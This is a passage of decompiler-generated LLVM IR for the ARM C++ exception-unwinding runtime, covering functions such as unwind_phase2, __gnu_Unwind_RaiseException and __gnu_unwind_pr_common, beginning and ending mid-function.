  store i32 %tmp, i32* %v4_22170, align 4
  %v1_22174 = add i32 %entry_vrs, 60
  %v2_22174 = inttoptr i32 %v1_22174 to i32*
  %v3_22174 = load i32, i32* %v2_22174, align 4
  %v2_2217c = add i32 %entry_vrs, 64
  %v3_2217c = inttoptr i32 %v2_2217c to i32*
  store i32 %v3_22174, i32* %v3_2217c, align 4
  %v3_22184 = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_22184

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_2219c6 = add i32 %vrs, 64
  %v2_2219c7 = inttoptr i32 %v1_2219c6 to i32*
  %v3_2219c8 = load i32, i32* %v2_2219c7, align 4
  %v2_221a09 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_2219c8)
  store i32 %v2_221a09, i32* %r0.global-to-local, align 4
  %v2_221a411 = icmp eq i32 %v2_221a09, 0
  br i1 %v2_221a411, label %dec_label_pc_221ac, label %dec_label_pc_221dc

dec_label_pc_221ac:                               ; preds = %entry, %dec_label_pc_221ac.dec_label_pc_22198_crit_edge
  %v0_221ac = load i32, i32* @r5, align 4
  %v1_221ac = add i32 %v0_221ac, 64
  %v2_221ac = inttoptr i32 %v1_221ac to i32*
  %v3_221ac = load i32, i32* %v2_221ac, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_221b4 = load i32, i32* @r4, align 4
  %v2_221b4 = add i32 %v1_221b4, 20
  %v3_221b4 = inttoptr i32 %v2_221b4 to i32*
  store i32 %v3_221ac, i32* %v3_221b4, align 4
  %v0_221b8 = load i32, i32* @r4, align 4
  %v1_221c0 = add i32 %v0_221b8, 16
  %v2_221c0 = inttoptr i32 %v1_221c0 to i32*
  %v3_221c0 = load i32, i32* %v2_221c0, align 4
  call void @__pseudo_branch(i32 %v3_221c0)
  %v0_221cc = load i32, i32* %r0.global-to-local, align 4
  %v7_221cc = icmp eq i32 %v0_221cc, 8
  br i1 %v7_221cc, label %dec_label_pc_221ac.dec_label_pc_22198_crit_edge, label %dec_label_pc_221d4

dec_label_pc_221ac.dec_label_pc_22198_crit_edge:  ; preds = %dec_label_pc_221ac
  %v0_22198.pre = load i32, i32* @r4, align 4
  %v0_2219c.pre = load i32, i32* @r5, align 4
  store i32 %v0_22198.pre, i32* %r0.global-to-local, align 4
  %v1_2219c = add i32 %v0_2219c.pre, 64
  %v2_2219c = inttoptr i32 %v1_2219c to i32*
  %v3_2219c = load i32, i32* %v2_2219c, align 4
  %v2_221a0 = call i32 @get_eit_entry(i32 %v0_22198.pre, i32 %v3_2219c)
  store i32 %v2_221a0, i32* %r0.global-to-local, align 4
  %v2_221a4 = icmp eq i32 %v2_221a0, 0
  br i1 %v2_221a4, label %dec_label_pc_221ac, label %dec_label_pc_221dc

dec_label_pc_221d4:                               ; preds = %dec_label_pc_221ac
  %v7_221d4 = icmp eq i32 %v0_221cc, 7
  br i1 %v7_221d4, label %dec_label_pc_221e0, label %dec_label_pc_221dc

dec_label_pc_221dc:                               ; preds = %entry, %dec_label_pc_221ac.dec_label_pc_22198_crit_edge, %dec_label_pc_221d4
  %v0_221dc = call i32 @abort()
  store i32 %v0_221dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221e0

dec_label_pc_221e0:                               ; preds = %dec_label_pc_221d4, %dec_label_pc_221dc
  %v0_221e0 = load i32, i32* @r5, align 4
  %v1_221e0 = add i32 %v0_221e0, 4
  store i32 %v1_221e0, i32* %r0.global-to-local, align 4
  %v1_221e4 = inttoptr i32 %v1_221e0 to i32*
  %v2_221e4 = call i32 @__restore_core_regs(i32* %v1_221e4)
  store i32 %v2_221e4, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_221e0, { 1, 0 }
  uselistorder label %dec_label_pc_221dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_221ac, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_221e8 = add i32 %ucbp, 20
  %v2_221e8 = inttoptr i32 %v1_221e8 to i32*
  %v3_221e8 = load i32, i32* %v2_221e8, align 4
  %v1_221f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_221f0 = add i32 %v1_221f0, 64
  %v3_221f0 = inttoptr i32 %v2_221f0 to i32*
  store i32 %v3_221e8, i32* %v3_221f0, align 4
  %v1_221f4 = add i32 %ucbp, 12
  %v2_221f4 = inttoptr i32 %v1_221f4 to i32*
  %v3_221f4 = load i32, i32* %v2_221f4, align 4
  %v2_221f8 = icmp eq i32 %v3_221f4, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_22204 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_22204, i32* @r5, align 4
  br i1 %v2_221f8, label %dec_label_pc_2220c, label %dec_label_pc_22248

dec_label_pc_2220c:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_22218 = add i32 %ucbp, 16
  %v2_22218 = inttoptr i32 %v1_22218 to i32*
  %v3_22218 = load i32, i32* %v2_22218, align 4
  call void @__pseudo_branch(i32 %v3_22218)
  br i1 false, label %dec_label_pc_22240, label %dec_label_pc_2222c

dec_label_pc_2222c:                               ; preds = %dec_label_pc_2220c
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_179f4.1606 to i32))
  %v0_22234 = load i32, i32* @r4, align 4
  %v0_22238 = load i32, i32* @r5, align 4
  store i32 %v0_22238, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_22234, i32 %v0_22238)
  br label %dec_label_pc_22240

dec_label_pc_22240:                               ; preds = %dec_label_pc_2220c, %dec_label_pc_2222c
  %v0_22240 = load i32, i32* @r5, align 4
  %v1_22240 = add i32 %v0_22240, 4
  %v1_22244 = inttoptr i32 %v1_22240 to i32*
  %v2_22244 = call i32 @__restore_core_regs(i32* %v1_22244)
  %v1_2224c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_22248

dec_label_pc_22248:                               ; preds = %entry, %dec_label_pc_22240
  %v1_2224c = phi i32 [ %v0_22204, %entry ], [ %v1_2224c.pre, %dec_label_pc_22240 ]
  %v3_2224c = call i32 @unwind_phase2_forced(i32 1, i32 %v1_2224c, i32 1)
  %v0_22250 = call i32 @abort()
  ret i32 %v0_22250

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 10, 2, 1, 9, 8, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 82, 83, 84, 85, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 7, 5, 6, 8, 9, 10, 11, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 52, 53, 54, 55, 71, 72, 73, 74, 12, 86, 15, 88, 89, 90, 91, 92, 67, 64, 65, 66, 61, 62, 63, 68, 50, 75, 69, 70, 56, 57, 58, 59, 60, 49, 16, 17, 18, 19, 20, 0, 97, 101, 100, 99, 93, 94, 21, 22, 13, 23, 24, 25, 95, 96, 98, 80, 81, 77, 1, 78, 76, 14, 79, 87, 2, 3, 4 }
  uselistorder i1 true, { 0, 3, 4, 5, 6, 7, 1, 152, 2, 133, 8, 9, 10, 11, 12, 13, 124, 125, 134, 135, 126, 14, 15, 16, 127, 128, 129, 136, 17, 18, 19, 20, 23, 22, 21, 154, 155, 156, 157, 158, 159, 160, 130, 161, 162, 163, 140, 164, 165, 166, 167, 131, 168, 169, 170, 171, 172, 173, 174, 24, 175, 153, 176, 25, 26, 177, 178, 179, 180, 181, 27, 182, 183, 28, 29, 30, 31, 32, 33, 34, 137, 184, 35, 185, 186, 187, 188, 36, 107, 141, 189, 37, 106, 190, 38, 105, 191, 192, 193, 194, 39, 195, 142, 40, 109, 196, 41, 108, 197, 198, 42, 199, 200, 201, 43, 202, 203, 148, 46, 47, 48, 49, 44, 45, 149, 50, 204, 205, 51, 110, 52, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 54, 112, 55, 216, 217, 218, 56, 111, 219, 57, 53, 220, 221, 150, 58, 222, 223, 60, 114, 61, 224, 225, 121, 226, 132, 227, 228, 59, 115, 229, 230, 231, 62, 113, 232, 63, 116, 233, 234, 235, 64, 236, 237, 238, 239, 240, 65, 66, 143, 67, 68, 69, 151, 117, 241, 242, 243, 139, 244, 138, 70, 118, 119, 245, 145, 246, 247, 72, 248, 249, 73, 120, 251, 71, 252, 250, 253, 144, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 122, 94, 95, 96, 97, 123, 254, 255, 256, 98, 257, 258, 99, 259, 100, 147, 260, 261, 146, 101, 102, 103, 104 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_22248, { 1, 0 }
  uselistorder label %dec_label_pc_22240, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_22254 = load i32, i32* @r4, align 4
  store i32 %v3_22254, i32* %stack_var_-16, align 4
  %v6_22254 = load i32, i32* @r5, align 4
  %v9_22254 = load i32, i32* @r6, align 4
  %v12_22254 = load i32, i32* @lr, align 4
  %v1_22258 = add i32 %entry_vrs, 60
  %v2_22258 = inttoptr i32 %v1_22258 to i32*
  %v3_22258 = load i32, i32* %v2_22258, align 4
  %v2_2225c = add i32 %entry_vrs, 64
  %v3_2225c = inttoptr i32 %v2_2225c to i32*
  store i32 %v3_22258, i32* %v3_2225c, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_2228c = load i32, i32* %v3_2225c, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_222a4 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_2228c)
  %v2_222a8 = icmp eq i32 %v2_222a4, 0
  br i1 %v2_222a8, label %dec_label_pc_222b0, label %dec_label_pc_222e4

dec_label_pc_222b0:                               ; preds = %entry
  %v0_222b0 = load i32, i32* @r5, align 4
  %v1_222b8 = add i32 %v0_222b0, 16
  %v2_222b8 = inttoptr i32 %v1_222b8 to i32*
  %v3_222b8 = load i32, i32* %v2_222b8, align 4
  call void @__pseudo_branch(i32 %v3_222b8)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_222d0 = load i32, i32* %saved_vrs_-320, align 4
  %v1_222d4 = urem i32 %v2_222d0, 2
  %v2_222d4 = icmp eq i32 %v1_222d4, 0
  br i1 %v2_222d4, label %dec_label_pc_222f4, label %dec_label_pc_222dc

dec_label_pc_222dc:                               ; preds = %dec_label_pc_222b0, %dec_label_pc_222f4
  %v0_222dc = phi i1 [ false, %dec_label_pc_222b0 ], [ %phitmp, %dec_label_pc_222f4 ]
  br i1 %v0_222dc, label %dec_label_pc_22300, label %dec_label_pc_222e4

dec_label_pc_222e4:                               ; preds = %entry, %dec_label_pc_222dc
  %v2_222ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_222ec, i32* @r4, align 4
  store i32 %v6_22254, i32* @r5, align 4
  store i32 %v9_22254, i32* @r6, align 4
  store i32 %v12_22254, i32* @lr, align 4
  ret i32 9

dec_label_pc_222f4:                               ; preds = %dec_label_pc_222b0
  %v2_222f4 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_222f4, i32* @r0, align 4
  %v1_222f8 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_222f4)
  %v0_222dc.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_222dc.pre, 6
  br label %dec_label_pc_222dc

dec_label_pc_22300:                               ; preds = %dec_label_pc_222dc
  %v0_22300 = load i32, i32* @r5, align 4
  %v0_22304 = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_22300, i32 %v0_22304)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_222e4, { 1, 0 }
  uselistorder label %dec_label_pc_222dc, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_2230c = add i32 %ucbp, 12
  %v2_2230c = inttoptr i32 %v1_2230c to i32*
  %v3_2230c = load i32, i32* %v2_2230c, align 4
  %v2_22310 = icmp eq i32 %v3_2230c, 0
  br i1 %v2_22310, label %dec_label_pc_22318, label %dec_label_pc_2231c

dec_label_pc_22318:                               ; preds = %entry
  %v2_22318 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_2231c

dec_label_pc_2231c:                               ; preds = %entry, %dec_label_pc_22318
  %v1_2231c = add i32 %entry_vrs, 60
  %v2_2231c = inttoptr i32 %v1_2231c to i32*
  %v3_2231c = load i32, i32* %v2_2231c, align 4
  %v2_22324 = add i32 %entry_vrs, 64
  %v3_22324 = inttoptr i32 %v2_22324 to i32*
  store i32 %v3_2231c, i32* %v3_22324, align 4
  %v3_22328 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_22328

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_2231c, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_22388

bb:                                               ; preds = %entry
  %v7_22340 = mul i32 %regclass, 4
  %v8_22340 = add i32 %v7_22340, ptrtoint (i32* @global_var_22348.1916 to i32)
  call void @__pseudo_branch(i32 %v8_22340)
  br label %dec_label_pc_22388

dec_label_pc_22388:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_22470 = load i32, i32* @r4, align 4
  %v6_22470 = load i32, i32* @r5, align 4
  %v2_22480 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_22488 = add i32 %ucbp, 76
  %v2_22488 = inttoptr i32 %v1_22488 to i32*
  %v3_22488 = load i32, i32* %v2_22488, align 4
  %v1_22494 = inttoptr i32 %v3_22488 to i32*
  %v2_22494 = load i32, i32* %v1_22494, align 4
  store i32 %v2_22494, i32* @lr, align 4
  %v4_22494 = add i32 %v3_22488, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_224a0 = urem i32 %state, 4
  store i32 %v1_224a0, i32* %r2.global-to-local, align 4
  %v1_224a4 = and i32 %state, 8
  store i32 %v1_224a4, i32* %r0.global-to-local, align 4
  %v4_224b4 = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_22494, i32* %v4_224b4, align 8
  br i1 %v2_22480, label %dec_label_pc_224c4, label %dec_label_pc_227a0

dec_label_pc_224c4:                               ; preds = %entry
  %v3_224c4 = mul i32 %v2_22494, 256
  store i32 %v3_224c4, i32* %v4_224b4, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_224dc

dec_label_pc_224dc:                               ; preds = %dec_label_pc_227a0, %dec_label_pc_224c4
  %v0_22500647090 = phi i32 [ %v2_227b8, %dec_label_pc_227a0 ], [ %v4_22494, %dec_label_pc_224c4 ]
  store i32 %v1_224a0, i32* %r2.global-to-local, align 4
  %v1_224e0 = add i32 %ucbp, 80
  %v2_224e0 = inttoptr i32 %v1_224e0 to i32*
  %v3_224e0 = load i32, i32* %v2_224e0, align 4
  %v7_224e4 = icmp eq i32 %v1_224a0, 2
  br i1 %v7_224e4, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_224dc
  %v2_224e8 = add i32 %ucbp, 56
  %v3_224e8 = inttoptr i32 %v2_224e8 to i32*
  %v4_224e8 = load i32, i32* %v3_224e8, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_224dc, %bb
  %v0_225006470 = phi i32 [ %v0_22500647090, %dec_label_pc_224dc ], [ %v4_224e8, %bb ]
  %v1_224ec = urem i32 %v3_224e0, 2
  %v2_224ec = icmp eq i32 %v1_224ec, 0
  br i1 %v2_224ec, label %dec_label_pc_22500.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_225c0

dec_label_pc_22500.preheader:                     ; preds = %bb148
  %v1_225006571 = inttoptr i32 %v0_225006470 to i32*
  %v2_225006672 = load i32, i32* %v1_225006571, align 4
  %v2_225046874 = icmp eq i32 %v2_225006672, 0
  br i1 %v2_225046874, label %dec_label_pc_225c0, label %dec_label_pc_2250c.preheader.lr.ph.lr.ph

dec_label_pc_2250c.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_22500.preheader
  %v7_22510 = icmp eq i32 %id, 2
  %v2_2259c = icmp eq i32 %v1_224a0, 0
  %v2_22768 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_22684 = icmp eq i32 %v1_224a4, 0
  br label %dec_label_pc_2250c.preheader.lr.ph

dec_label_pc_2250c.preheader.lr.ph:               ; preds = %dec_label_pc_2250c.preheader.lr.ph.lr.ph, %dec_label_pc_227d4
  %v1_2251c96 = phi i32 [ %v2_225006672, %dec_label_pc_2250c.preheader.lr.ph.lr.ph ], [ %v2_2250066, %dec_label_pc_227d4 ]
  %v1_2251893 = phi i32 [ %v0_225006470, %dec_label_pc_2250c.preheader.lr.ph.lr.ph ], [ %v2_227d8, %dec_label_pc_227d4 ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_2250c.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_227d4 ]
  br label %dec_label_pc_2250c.preheader

dec_label_pc_2250c.preheader:                     ; preds = %dec_label_pc_2250c.preheader.lr.ph, %dec_label_pc_22798
  %v1_2251c95 = phi i32 [ %v1_2251c96, %dec_label_pc_2250c.preheader.lr.ph ], [ %v2_22500, %dec_label_pc_22798 ]
  %v1_2251892 = phi i32 [ %v1_2251893, %dec_label_pc_2250c.preheader.lr.ph ], [ %v1_22798, %dec_label_pc_22798 ]
  br label %dec_label_pc_2250c

dec_label_pc_2250c:                               ; preds = %dec_label_pc_2250c.preheader, %dec_label_pc_225b0
  %v1_2251c = phi i32 [ %v1_2251c95, %dec_label_pc_2250c.preheader ], [ %v2_225b4, %dec_label_pc_225b0 ]
  %v1_22530 = phi i32 [ %v1_2251892, %dec_label_pc_2250c.preheader ], [ %v1_225b0, %dec_label_pc_225b0 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_22510, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_2250c
  %v2_22514 = add i32 %v1_22530, 4
  %v3_22514 = inttoptr i32 %v2_22514 to i32*
  %v4_22514 = load i32, i32* %v3_22514, align 4
  store i32 %v4_22514, i32* @r5, align 4
  store i32 %v1_2251c, i32* @r6, align 4
  %v0_22520109 = load i32, i32* @r8, align 4
  %v1_22520110 = add i32 %v0_22520109, 72
  %v2_22520111 = inttoptr i32 %v1_22520110 to i32*
  %v3_22520112 = load i32, i32* %v2_22520111, align 4
  store i32 %v3_22520112, i32* @lr, align 4
  %v2_2252c = add i32 %v1_22530, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_2250c
  %v2_22518 = add i32 %v1_22530, 2
  %v3_22518 = inttoptr i32 %v2_22518 to i16*
  %v4_22518 = load i16, i16* %v3_22518, align 2
  %v5_22518 = zext i16 %v4_22518 to i32
  store i32 %v5_22518, i32* @r5, align 4
  %v0_22520 = load i32, i32* @r8, align 4
  %v1_22520 = add i32 %v0_22520, 72
  %v2_22520 = inttoptr i32 %v1_22520 to i32*
  %v3_22520 = load i32, i32* %v2_22520, align 4
  store i32 %v3_22520, i32* @lr, align 4
  %v2_22528 = inttoptr i32 %v1_22530 to i16*
  %v3_22528 = load i16, i16* %v2_22528, align 2
  %v4_22528 = zext i16 %v3_22528 to i32
  store i32 %v4_22528, i32* @r6, align 4
  %v2_22530 = add i32 %v1_22530, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_22530, %.thread16 ], [ %v2_2252c, %bb151 ]
  %v3_22520115 = phi i32 [ %v3_22520, %.thread16 ], [ %v3_22520112, %bb151 ]
  %v0_22538113 = phi i32 [ %v5_22518, %.thread16 ], [ %v4_22514, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_22538 = and i32 %v0_22538113, -2
  %v2_2253c = add i32 %v1_22538, %v3_22520115
  store i32 %v2_2253c, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_2254c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_2254c, i32* %r0.global-to-local, align 4
  %v5_22558 = call i32 @_Unwind_VRS_Get(i32 %v0_2254c, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22558, i32* %r0.global-to-local, align 4
  %v3_2255c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_2255c, i32* %r2.global-to-local, align 4
  %v0_22560 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_22560, %v3_2255c
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_2256c

._crit_edge:                                      ; preds = %bb152
  %v0_22584.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_2256c:                               ; preds = %bb152
  %v0_2256c = load i32, i32* @r6, align 4
  %v1_2256c = and i32 %v0_2256c, -2
  %v2_22570 = add i32 %v1_2256c, %v0_22560
  %v3_22574 = icmp ult i32 %v3_2255c, %v2_22570
  br i1 %v3_22574, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_2256c
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_2256c
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_22584 = phi i32 [ %v0_22584.pre, %._crit_edge ], [ %v0_2256c, %bb153 ], [ %v0_2256c, %.thread20 ]
  %v0_2272c = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_22580 = load i32, i32* @r5, align 4
  %v1_22584 = urem i32 %v0_22584, 2
  %v1_22580 = mul i32 %v0_22580, 2
  %v3_22588 = and i32 %v1_22580, 2
  %v4_22588 = or i32 %v3_22588, %v1_22584
  store i32 %v4_22588, i32* %r2.global-to-local, align 4
  %v7_2258c = icmp eq i32 %v4_22588, 1
  br i1 %v7_2258c, label %dec_label_pc_22720, label %dec_label_pc_22594

dec_label_pc_22594:                               ; preds = %bb154
  %v2_2258c = icmp eq i32 %v4_22588, 0
  br i1 %v2_2258c, label %dec_label_pc_22598, label %dec_label_pc_22648

dec_label_pc_22598:                               ; preds = %dec_label_pc_22594
  store i32 %v1_224a0, i32* %r2.global-to-local, align 4
  br i1 %v2_2259c, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_22598
  %v0_225b0119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_225b0

bb155:                                            ; preds = %dec_label_pc_22598
  %v2_225a8 = icmp eq i32 %v0_2272c, 0
  %v0_225b0 = load i32, i32* @r7, align 4
  br i1 %v2_225a8, label %dec_label_pc_225b0, label %dec_label_pc_22928

dec_label_pc_225b0:                               ; preds = %.thread, %bb155
  %v0_225b0120 = phi i32 [ %v0_225b0119, %.thread ], [ %v0_225b0, %bb155 ]
  %v1_225b0 = add i32 %v0_225b0120, 4
  %v1_225b4 = inttoptr i32 %v1_225b0 to i32*
  %v2_225b4 = load i32, i32* %v1_225b4, align 4
  %v2_225b8 = icmp eq i32 %v2_225b4, 0
  br i1 %v2_225b8, label %dec_label_pc_225c0, label %dec_label_pc_2250c

dec_label_pc_225c0:                               ; preds = %dec_label_pc_227d4, %dec_label_pc_22798, %dec_label_pc_225b0, %dec_label_pc_22500.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_22500.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_225b0 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_22798 ], [ %stack_var_-76.4, %dec_label_pc_227d4 ]
  %v0_225c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_225c0, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_225c8 = call i32 @__gnu_unwind_execute(i32 %v0_225c0, %anon_struct_13* %tmp156)
  store i32 %v4_225c8, i32* %r0.global-to-local, align 4
  store i32 %v4_225c8, i32* %r5.global-to-local, align 4
  %v2_225cc = icmp eq i32 %v4_225c8, 0
  br i1 %v2_225cc, label %dec_label_pc_225d4, label %dec_label_pc_22650

dec_label_pc_225d4:                               ; preds = %dec_label_pc_225c0
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_225d8 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_225d8, label %bb157, label %dec_label_pc_225e4

bb157:                                            ; preds = %dec_label_pc_225d4
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22654

dec_label_pc_225e4:                               ; preds = %dec_label_pc_225d4
  %v2_225e4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_225e4, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_225f4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_225f4, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_225fc = call i32 @_Unwind_VRS_Get(i32 %v0_225f4, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_22600 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_225f4, i32* %r0.global-to-local, align 4
  %v5_22614 = call i32 @_Unwind_VRS_Set(i32 %v0_225f4, i32 %v0_22600, i32 14, i32 %v0_22600, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22614, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v4_22620 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 40) to i32*), align 4
  %v0_22624 = load i32, i32* %r5.global-to-local, align 4
  %v0_22628 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22628, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_22620, i32* %stack_var_-48, align 4
  %v5_2263c = call i32 @_Unwind_VRS_Set(i32 %v0_22628, i32 %v0_22624, i32 15, i32 %v0_22624, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22654

dec_label_pc_22648:                               ; preds = %dec_label_pc_22594
  %v7_22648 = icmp eq i32 %v4_22588, 2
  br i1 %v7_22648, label %dec_label_pc_22660, label %dec_label_pc_22650

dec_label_pc_22650:                               ; preds = %dec_label_pc_22648, %dec_label_pc_22734, %dec_label_pc_225c0, %dec_label_pc_22928
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22654

dec_label_pc_22654:                               ; preds = %bb157, %dec_label_pc_22960, %dec_label_pc_228f0, %bb166, %dec_label_pc_225e4, %dec_label_pc_22650
  %v1_2265c = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_22960 ], [ %v1_2265c.pre, %dec_label_pc_228f0 ], [ 7, %bb166 ], [ 7, %dec_label_pc_225e4 ], [ 9, %dec_label_pc_22650 ]
  store i32 %v3_22470, i32* %r4.global-to-local, align 4
  store i32 %v6_22470, i32* %r5.global-to-local, align 4
  ret i32 %v1_2265c

dec_label_pc_22660:                               ; preds = %dec_label_pc_22648
  store i32 %v1_224a0, i32* %r2.global-to-local, align 4
  %v0_22664 = load i32, i32* @r7, align 4
  %v1_22664 = inttoptr i32 %v0_22664 to i32*
  %v2_22664 = load i32, i32* %v1_22664, align 4
